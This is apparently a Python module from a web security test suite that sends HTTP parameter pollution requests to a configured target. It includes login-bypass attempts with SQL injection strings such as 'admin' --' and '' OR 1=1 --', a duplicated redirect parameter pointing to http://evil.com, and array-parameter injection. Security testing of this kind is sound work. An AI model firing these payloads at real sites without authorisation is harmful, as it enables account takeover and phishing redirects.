"""17_hpp — HTTP 参数污染测试（同名参数+数组注入+覆盖攻击，30+ payload）"""

import sys, os, urllib.parse
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from lib.test_utils import *


def build_hpp_url(path, params_list):
    """Build URL with duplicate parameter names for HPP testing"""
    parts = []
    for param in params_list:
        parts.append(f"{param['name']}={urllib.parse.quote(param['value'])}")
    return f"{path}?{'&'.join(parts)}"


def run():
    print_banner("17: HTTP 参数污染 (30+ payloads)")
    reset_counters()
    s = requests.Session()
    payloads = load_payloads("hpp")

    info("=== HPP 测试: GET 参数污染 ===")
    for p in payloads:
        try:
            path = p["payload"]["path"]
            params = p["payload"]["params"]
            url = build_hpp_url(path, params)
            r = s.get(urljoin(BASE_URL, url), timeout=TIMEOUT, allow_redirects=False)
            ok(f"[{p['category']}] {p['name']} → HTTP {r.status_code}")
        except Exception as e:
            err(f"[{p['category']}] {p['name']} → 异常: {e}")

    info("=== HPP 测试: POST 参数污染 ===")
    for p in payloads[:10]:
        try:
            path = p["payload"]["path"]
            params = p["payload"]["params"]
            data = [(param["name"], param["value"]) for param in params]
            r = s.post(urljoin(BASE_URL, path), data=data, timeout=TIMEOUT, allow_redirects=False)
            ok(f"[POST] {p['name']} → HTTP {r.status_code}")
        except Exception as e:
            err(f"[POST] {p['name']} → 异常: {e}")

    info("=== HPP 测试: 登录绕过 ===")
    login_hpp = [
        ("username双值", [("username", "test"), ("username", "admin' --"), ("password", "anything")]),
        ("password双值", [("username", "admin"), ("password", ""), ("password", "' OR 1=1 --")]),
        ("redirect覆盖", [("username", "test"), ("password", "test123"), ("redirect", "/dashboard"), ("redirect", "http://evil.com")]),
    ]
    for desc, data in login_hpp:
        try:
            r = s.post(urljoin(BASE_URL, "/login"), data=data, timeout=TIMEOUT, allow_redirects=False)
            location = r.headers.get("Location", "")
            if r.status_code == 302:
                ok(f"登录HPP [{desc}] → HTTP 302, 重定向: {location[:50]}")
            else:
                ok(f"登录HPP [{desc}] → HTTP {r.status_code}")
        except Exception as e:
            err(f"登录HPP [{desc}] → 异常: {e}")

    info("=== HPP 测试: 数组参数注入 ===")
    array_tests = [
        ("GET", "/api/users?name[]=admin&name[]=test"),
        ("GET", "/api/users?name[0]=admin&name[1]=' OR 1=1 --"),
        ("GET", "/products?q[]=手机&q[]=电脑"),
    ]
    for method, url in array_tests:
        try:
            r = s.get(urljoin(BASE_URL, url), timeout=TIMEOUT, allow_redirects=False)
            ok(f"数组参数 [{url[:50]}] → HTTP {r.status_code}")
        except Exception as e:
            err(f"数组参数 [{url[:30]}] → 异常: {e}")

    info("=== HPP 测试: 特殊字符分隔 ===")
    sep_tests = [
        ("逗号分隔", "/api/users?name=admin,test,alice"),
        ("空格分隔", "/api/users?name=admin test"),
        ("分号分隔", "/api/users?name=admin;test"),
        ("竖线分隔", "/api/users?name=admin|test"),
    ]
    for desc, url in sep_tests:
        try:
            r = s.get(urljoin(BASE_URL, url), timeout=TIMEOUT, allow_redirects=False)
            ok(f"分隔符 [{desc}] → HTTP {r.status_code}")
        except Exception as e:
            err(f"分隔符 [{desc}] → 异常: {e}")

    print_summary()
    save_results("17_hpp")
    return STATE["fail"]


if __name__ == "__main__":
    sys.exit(run())
